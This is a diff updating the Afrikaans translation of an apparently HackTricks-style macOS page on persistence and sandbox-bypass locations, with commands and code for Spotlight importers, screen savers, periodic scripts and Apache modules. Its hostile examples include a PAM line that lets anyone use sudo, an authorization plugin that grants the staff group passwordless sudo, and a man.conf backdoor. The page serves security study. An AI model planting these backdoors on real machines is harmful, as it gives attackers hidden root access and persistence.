@@ -930,52 +944,52 @@ Let daarop dat die binêre wat jou biblioteek laai 'n **baie beperkende sandbox*
 ```
 ### Finder Sync Plugins
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
-**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)
+**Verslag**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
+**Verslag**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)
 
-- Nuttig om sandbox te omseil: **Nee, omdat jy jou eie app moet uitvoer**
-- TCC omseiling: ???
+- Nuttig om die sandbox te omseil: **Nee, omdat jy jou eie app moet uitvoer**
+- TCC-omseiling: ???
 
 #### Ligging
 
-- 'n Spesifieke app
+- 'n spesifieke app
 
-#### Beskrywing & Exploit
+#### Beskrywing & Uitbuiting
 
-'n Toepassing voorbeeld met 'n Finder Sync Extension [**kan hier gevind word**](https://github.com/D00MFist/InSync).
+'n toepassingsvoorbeeld met 'n Finder Sync Extension [**is hier te vind**](https://github.com/D00MFist/InSync).
 
-Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding sal binne 'n toepassing gaan wat uitgevoer sal word. Boonop, om die uitbreiding in staat te stel om sy kode uit te voer, **moet dit onderteken wees** met 'n geldige Apple ontwikkelaar sertifikaat, dit moet **sandboxed** wees (alhoewel verslapte uitsonderings bygevoeg kan word) en dit moet geregistreer wees met iets soos:
+Toepassings kan `Finder Sync Extensions` hê. Hierdie uitbreiding sal binne 'n toepassing geplaas word wat uitgevoer sal word. Verder, sodat die uitbreiding sy kode kan uitvoer, moet dit **signed** wees met 'n geldige Apple developer certificate, dit moet **sandboxed** wees (alhoewel relaxed exceptions bygevoeg kan word) en dit moet geregistreer wees met iets soos:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
 ```
-### Skermbeskermer
+### Screen Saver
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
-Skrywe: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
+Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
 
 - Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-- Maar jy sal in 'n algemene toepassing sandbox eindig
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Maar jy sal in 'n algemene application sandbox beland
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - `/System/Library/Screen Savers`
-- Wortel benodig
-- **Trigger**: Kies die skermbeskermer
+- Root vereis
+- **Trigger**: Kies die Screen Saver
 - `/Library/Screen Savers`
-- Wortel benodig
-- **Trigger**: Kies die skermbeskermer
+- Root vereis
+- **Trigger**: Kies die Screen Saver
 - `~/Library/Screen Savers`
-- **Trigger**: Kies die skermbeskermer
+- **Trigger**: Kies die Screen Saver
 
 <figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Beskrywing & Exploit
 
-Skep 'n nuwe projek in Xcode en kies die sjabloon om 'n nuwe **Skermbeskermer** te genereer. Voeg dan jou kode daaraan toe, byvoorbeeld die volgende kode om logs te genereer.
+Skep 'n nuwe projek in Xcode en kies die template om 'n nuwe **Screen Saver** te genereer. Voeg dan jou kode by dit, byvoorbeeld die volgende kode om logs te genereer.
 
-**Bou** dit, en kopieer die `.saver` bundel na **`~/Library/Screen Savers`**. Open dan die Skermbeskermer GUI en as jy net daarop klik, moet dit baie logs genereer:
+**Build** dit, en kopieer die `.saver` bundle na **`~/Library/Screen Savers`**. Daarna, open die Screen Saver GUI en as jy net daarop klik, behoort dit 'n klomp logs te genereer:
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'
 
@@ -985,9 +999,9 @@ Timestamp                       (process)[PID]
 2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
 ```
 > [!CAUTION]
-> Let daarop dat omdat jy binne die regte van die binêre wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) **`com.apple.security.app-sandbox`** kan vind, jy sal **binne die algemene toepassings-sandbox** wees.
+> Let wel dat omdat binne die entitlements van die binary wat hierdie kode laai (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) jy **`com.apple.security.app-sandbox`** kan vind, sal jy **binne die algemene application sandbox** wees.
 
-Saver code:
+Saver-kode:
 ```objectivec
 //
 //  ScreenSaverExampleView.m
@@ -1055,37 +1069,37 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 ```
 ### Spotlight Plugins
 
-writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)
+skryftoelichting: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)
 
-- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-- Maar jy sal in 'n toepassing sandbox eindig
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om die sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
+- Maar jy sal in 'n application sandbox beland
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 - Die sandbox lyk baie beperk
 
-#### Location
+#### Ligging
 
 - `~/Library/Spotlight/`
-- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
+- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
 - `/Library/Spotlight/`
-- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
-- Root vereis
+- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
+- Root required
 - `/System/Library/Spotlight/`
-- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
-- Root vereis
+- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
+- Root required
 - `Some.app/Contents/Library/Spotlight/`
-- **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight plugin bestuur word, word geskep.
-- Nuwe toepassing vereis
+- **Trigger**: 'n nuwe lêer met 'n uitbreiding wat deur die Spotlight-plugin bestuur word, word geskep.
+- New app required
 
-#### Description & Exploitation
+#### Beskrywing & Eksploitasie
 
-Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
-Om hierdie vinnige soekvermoë te fasiliteer, hou Spotlight 'n **eie databasis** en skep 'n indeks deur **die meeste lêers te ontleed**, wat vinnige soektogte deur sowel lêernames as hul inhoud moontlik maak.
+Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers van **vinnige en omvattende toegang tot data op hul rekenaars** te voorsien.\
+Om hierdie vinnige soekvermoë te fasiliteer, onderhou Spotlight 'n **proprietêre databasis** en skep 'n indeks deur die meeste lêers te **ontleed**, wat vinnige soektogte deur beide lêernaam en hul inhoud moontlik maak.
 
-Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses orkestreer die hele Spotlight diens. Ter aanvulling hiervan, is daar verskeie 'mdworker' daemons wat 'n verskeidenheid onderhoudstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight invoerder plugins, of **".mdimporter bundles**", wat Spotlight in staat stel om inhoud oor 'n diverse reeks lêerformate te verstaan en te indekseer.
+Die onderliggende meganisme van Spotlight betrek 'n sentrale proses met die naam 'mds', wat staan vir **'metadata server.'** Hierdie proses orkestreer die hele Spotlight-diens. Aanvullend hierop is daar verskeie 'mdworker' daemons wat 'n verskeidenheid onderhoudstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight importer plugins, of **`.mdimporter` bundles**, wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.
 
-Die plugins of **`.mdimporter`** bundles is geleë in die plekke wat vroeër genoem is en as 'n nuwe bundle verskyn, word dit binne 'n minuut gelaai (geen behoefte om enige diens te herbegin nie). Hierdie bundles moet aandui watter **lêertipe en uitbreidings hulle kan bestuur**, sodat Spotlight dit sal gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.
+Die plugins of **`.mdimporter`** bundles is geleë op die plekke hierbo genoem en as 'n nuwe bundle verskyn, word dit binne minute gelaai (geen behoefte om 'n diens te herbegin nie). Hierdie bundles moet aandui watter **lêertipe en uitbreidings hulle kan hanteer**, sodoende sal Spotlight hulle gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.
 
-Dit is moontlik om **alle `mdimporters`** wat gelaai is, te vind:
+Dit is moontlik om **al die `mdimporters`** wat gelaai en aan die loop is, te vind deur:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1094,7 +1108,7 @@ Paths: id(501) (
 "/System/Library/Spotlight/PDF.mdimporter",
 [...]
 ```
-En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers (uitbreidings `.iba` en `.book` onder andere) te ontleed:
+En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers te ontleed (uitbreidings `.iba` en `.book` onder andere):
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
@@ -1131,61 +1145,61 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 > [!CAUTION]
-> As jy die Plist van ander `mdimporter` nagaan, mag jy nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en dit nie nodig is om uitbreidings te spesifiseer nie.
+> As jy die Plist van ander `mdimporter` nagaan sal jy moontlik nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en dit hoef nie uitbreidings te spesifiseer nie.
 >
-> Boonop neem stelsels standaard plugins altyd prioriteit, so 'n aanvaller kan slegs toegang verkry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.
+> Verder het stelsel-standaard plugins altyd voorrang, so 'n aanvaller kan slegs toegang kry tot lêers wat nie andersins deur Apple's eie `mdimporters` geïndekseer word nie.
 
-Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun en dit in **`schema.xml`** reflekteer.\
-Verander dan die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.
+Om jou eie importer te skep kan jy begin met hierdie projek: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding wat jy wil ondersteun, ondersteun en dit in **`schema.xml`** weerkaats.\
+Verander daarna die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.
 
-Laastens **bou en kopieer jou nuwe `.mdimporter`** na een van die vorige plekke en jy kan nagaan of dit gelaai is **deur die logs te monitor** of deur **`mdimport -L.`** te kontroleer.
+Bou uiteindelik jou nuwe `.mdimporter` en kopieer dit na een van die drie vorige lokasies en jy kan nagaan of dit gelaai is deur die logs te monitor of deur **`mdimport -L`** te kontroleer.
 
-### ~~Voorkeurpaneel~~
+### ~~Preference Pane~~
 
 > [!CAUTION]
-> Dit lyk nie of dit meer werk nie.
+> Dit lyk nie of dit nog werk nie.
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)
 
 - Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 - Dit benodig 'n spesifieke gebruikersaksie
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plek
+#### Location
 
 - **`/System/Library/PreferencePanes`**
 - **`/Library/PreferencePanes`**
 - **`~/Library/PreferencePanes`**
 
-#### Beskrywing
+#### Description
 
-Dit lyk nie of dit meer werk nie.
+Dit lyk nie of dit nog werk nie.
 
-## Root Sandbox Omseiling
+## Root Sandbox Bypass
 
 > [!TIP]
-> Hier kan jy begin plekke vind wat nuttig is vir **sandbox omseiling** wat jou toelaat om eenvoudig iets uit te voer deur **dit in 'n lêer te skryf** terwyl jy **root** is en/of ander **vreemde toestande** vereis.
+> Hier kan jy beginlokasies vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** terwyl jy **root** is en/of wat ander **vreemde toestande** vereis.
 
-### Periodiek
+### Periodic
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)
 
 - Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 - Maar jy moet root wees
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plek
+#### Location
 
 - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-- Root benodig
+- Benodig root
 - **Trigger**: Wanneer die tyd aanbreek
 - `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
-- Root benodig
+- Benodig root
 - **Trigger**: Wanneer die tyd aanbreek
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Die periodieke skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` geconfigureer is. Let daarop dat skripte wat in `/etc/periodic/` gestoor is, **uitgevoer** word as die **eienaar van die lêer,** so dit sal nie werk vir 'n potensiële voorregverhoging nie.
+Die periodic-skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **launch daemons** wat in `/System/Library/LaunchDaemons/com.apple.periodic*` gekonfigureer is. Let daarop dat skripte wat in `/etc/periodic/` gestoor word **uitgevoer** word as die **eienaar van die lêer,** so dit sal nie werk vir 'n moontlike privilege escalation nie.
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1223,37 +1237,37 @@ daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-As jy enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` skryf, sal dit **vroeër of later uitgevoer word**.
+As jy daarin slaag om enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` te skryf, sal dit **uiteindelik uitgevoer word**.
 
 > [!WARNING]
-> Let daarop dat die periodieke skrip **uitgevoer sal word as die eienaar van die skrip**. So as 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan voorkom dat voorregte verhoog word).
+> Let daarop dat die periodieke skrip **as die eienaar van die skrip uitgevoer sal word**. Dus, as 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan privilege escalation attacks voorkom).
 
 ### PAM
 
-Skrywe: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)
+Skryfbeskrywing: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
+Skryfbeskrywing: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)
 
 - Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 - Maar jy moet root wees
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - Root altyd vereis
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Exploitation
 
-Aangesien PAM meer gefokus is op **volharding** en malware as op maklike uitvoering binne macOS, sal hierdie blog nie 'n gedetailleerde verduideliking gee nie, **lees die skrywe om hierdie tegniek beter te verstaan**.
+Aangesien PAM meer gefokus is op **persistence** en malware as op maklike uitvoering binne macOS, gaan hierdie blog nie 'n gedetaileerde verduideliking gee nie — **lees die writeups om hierdie tegniek beter te verstaan**.
 
-Kontroleer PAM-modules met:
+Kontroleer PAM modules met:
 ```bash
 ls -l /etc/pam.d
 ```
-'n Volharding/privilege escalation tegniek wat PAM misbruik, is so maklik soos om die module /etc/pam.d/sudo te wysig deur aan die begin die lyn by te voeg:
+'n persistence/privilege escalation technique abusing PAM is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en aan die begin die volgende reël by te voeg:
 ```bash
 auth       sufficient     pam_permit.so
 ```
-So dit sal **lyk soos** iets soos dit:
+Dit sal **so lyk**:
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1264,12 +1278,12 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-En daarom sal enige poging om **`sudo` te gebruik** werk.
+En daarom sal enige poging om **`sudo` sal werk**.
 
 > [!CAUTION]
-> Let daarop dat hierdie gids deur TCC beskerm word, so dit is hoogs waarskynlik dat die gebruiker 'n versoek sal ontvang om toegang te vra.
+> Let wel dat hierdie gids deur TCC beskerm word, dus is dit hoogs waarskynlik dat die gebruiker 'n prompt sal kry wat vir toegang vra.
 
-Nog 'n mooi voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM-modules te gee (en jy kan ook hierdie lêer backdoor):
+Nog 'n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM modules te gee (en jy kan hierdie lêer ook backdoor):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1280,24 +1294,24 @@ account    required       pam_opendirectory.so no_check_shell
 password   required       pam_opendirectory.so
 session    required       pam_launchd.so
 ```
-### Magtigingspluggins
+### Authorization Plugins
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
 Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
-- Nuttig om die sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-- Maar jy moet root wees en ekstra konfigurasies maak
-- TCC omseiling: ???
+- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
+- Maar jy moet root wees en ekstra configs maak
+- TCC bypass: ???
 
-#### Ligging
+#### Location
 
 - `/Library/Security/SecurityAgentPlugins/`
-- Root benodig
-- Dit is ook nodig om die magtiging databasis te konfigureer om die plugin te gebruik
+- Root vereis
+- Dit is ook nodig om die authorization database te konfigureer om die plugin te gebruik
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Jy kan 'n magtiging plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om volharding te handhaaf. Vir meer inligting oor hoe om een van hierdie pluggins te skep, kyk na die vorige writeups (en wees versigtig, 'n swak geskryfde een kan jou buitensluit en jy sal jou mac uit herstelmodus moet skoonmaak).
+Jy kan 'n authorization plugin skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om persistence te behou. Vir meer inligting oor hoe om een van hierdie plugins te skep, kyk na die vorige writeups (en wees versigtig — 'n swak geskrewe een kan jou uitslot en jy sal jou Mac vanuit recovery mode moet skoonmaak).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1312,11 +1326,11 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**Skuif** die bundel na die ligging om gelaai te word:
+**Skuif** die bundel na die ligging wat gelaai sal word:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
-Laastens voeg die **reël** by om hierdie Plugin te laai:
+Voeg uiteindelik die **reël** by om hierdie Plugin te laai:
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1335,37 +1349,37 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
-Die **`evaluate-mechanisms`** sal die magtigingsraamwerk vertel dat dit **'n eksterne meganisme vir magtiging** moet **aanroep**. Boonop sal **`privileged`** dit deur root laat uitvoer.
+Die **`evaluate-mechanisms`** sal die autorisasie-raamwerk vertel dat dit 'n eksterne meganisme vir autorisasie moet aanroep. Boonop sal **`privileged`** veroorsaak dat dit as root uitgevoer word.
 
-Trigger dit met:
+Roep dit aan met:
 ```bash
 security authorize com.asdf.asdf
 ```
-En dan moet die **staff-groep sudo** toegang hê (lees `/etc/sudoers` om te bevestig).
+En dan moet die **staff-groep moet sudo toegang hê** (lees `/etc/sudoers` om te bevestig).
 
 ### Man.conf
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
 
-- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
+- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Maar jy moet root wees en die gebruiker moet man gebruik
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Ligging
+#### Location
 
 - **`/private/etc/man.conf`**
-- Root vereis
+- Root benodig
 - **`/private/etc/man.conf`**: Wanneer man gebruik word
 
 #### Beskrywing & Exploit
 
-Die konfigurasie lêer **`/private/etc/man.conf`** dui die binêre/script aan wat gebruik moet word wanneer man dokumentasielêers geopen word. So die pad na die uitvoerbare kan gewysig word sodat wanneer die gebruiker man gebruik om 'n paar dokumente te lees, 'n backdoor uitgevoer word.
+Die config-lêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik word wanneer man-dokumentasie geopen word. Dus kan die pad na die executable gewysig word sodat elke keer as die gebruiker man gebruik om docs te lees 'n backdoor uitgevoer word.
 
-Byvoorbeeld gestel in **`/private/etc/man.conf`**:
+Byvoorbeeld stel in **`/private/etc/man.conf`**:
 ```
 MANPAGER /tmp/view
 ```
-En skep dan `/tmp/view` as:
+En skep dan `/tmp/view` soos:
 ```bash
 #!/bin/zsh
 
@@ -1375,32 +1389,32 @@ touch /tmp/manconf
 ```
 ### Apache2
 
-**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
+**Verslag**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
 - Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 - Maar jy moet root wees en apache moet loop
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
-- Httpd het nie regte nie
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+- Httpd het geen entitlements nie
 
 #### Ligging
 
 - **`/etc/apache2/httpd.conf`**
 - Root vereis
-- Trigger: Wanneer Apache2 begin word
+- Trigger: Wanneer Apache2 gestart word
 
 #### Beskrywing & Exploit
 
-Jy kan in `/etc/apache2/httpd.conf` aandui om 'n module te laai deur 'n lyn soos:
+Jy kan in `/etc/apache2/httpd.conf` aandui om 'n module te laad deur 'n reël soos die volgende by te voeg:
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste ding is dat jy dit of **met 'n geldige Apple-sertifikaat moet teken**, of jy moet **'n nuwe vertroude sertifikaat** in die stelsel voeg en dit **met dit teken**.
+Op hierdie manier sal jou gekompileerde module deur Apache gelaai word. Die enigste ding is dat jy óf dit moet **onderteken met 'n geldige Apple-sertifikaat**, óf jy moet 'n **nuwe vertroude sertifikaat** in die stelsel byvoeg en dit daarmee **onderteken**.
 
-Dan, indien nodig, om te verseker dat die bediener begin sal word, kan jy uitvoer:
+Indien nodig, om te verseker dat die bediener begin, kan jy die volgende uitvoer:
 ```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
 ```
-Kode voorbeeld vir die Dylb:
+Kodevoorbeeld vir die Dylb:
 ```objectivec
 #include <stdio.h>
 #include <syslog.h>
@@ -1412,38 +1426,38 @@ printf("[+] dylib constructor called from %s\n", argv[0]);
 syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 }
 ```
-### BSM ouditraamwerk
+### BSM audit framework
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)
 
-- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-- Maar jy moet root wees, auditd moet loop en 'n waarskuwing veroorsaak
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Maar jy moet root wees, auditd moet aan die gang wees en 'n waarskuwing veroorsaak
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - **`/etc/security/audit_warn`**
-- Root vereis
-- **Trigger**: Wanneer auditd 'n waarskuwing opspoor
+- Benodig root
+- **Trigger**: Wanneer auditd 'n waarskuwing bespeur
 
 #### Beskrywing & Exploit
 
-Wanneer auditd 'n waarskuwing opspoor, word die skrip **`/etc/security/audit_warn`** **uitgevoer**. So jy kan jou payload daarop voeg.
+Wanneer auditd 'n waarskuwing bespeur, word die script **`/etc/security/audit_warn`** **uitgevoer**. Dus kan jy jou payload daaraan voeg.
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
-U kan 'n waarskuwing afdwing met `sudo audit -n`.
+Jy kan 'n waarskuwing afdwing met `sudo audit -n`.
 
 ### Opstartitems
 
-> [!CAUTION] > **Dit is verouderd, so daar behoort niks in daardie gidse gevind te word nie.**
+> [!CAUTION] > **Dit is verouderd, dus behoort niks in daardie gidse gevind te word nie.**
 
-Die **StartupItem** is 'n gids wat binne ofwel `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas moet word. Sodra hierdie gids gevestig is, moet dit twee spesifieke lêers bevat:
+Die **StartupItem** is 'n gids wat in ofwel `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas behoort te word. Sodra hierdie gids bestaan, moet dit twee spesifieke lêers bevat:
 
-1. 'n **rc-skrip**: 'n shell-skrip wat by opstart uitgevoer word.
-2. 'n **plist-lêer**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.
+1. 'n **rc script**: 'n shell-skrip wat by opstart uitgevoer word.
+2. 'n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.
 
-Verseker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.
+Maak seker dat beide die rc script en die `StartupParameters.plist` lêer korrek in die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.
 
 {{#tabs}}
 {{#tab name="StartupParameters.plist"}}
@@ -1490,13 +1504,13 @@ RunService "$1"
 ### ~~emond~~
 
 > [!CAUTION]
-> Ek kan hierdie komponent nie in my macOS vind nie, so vir meer inligting kyk na die skrywe
+> Ek kan hierdie komponent nie in my macOS vind nie, so vir meer inligting, kyk die writeup
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
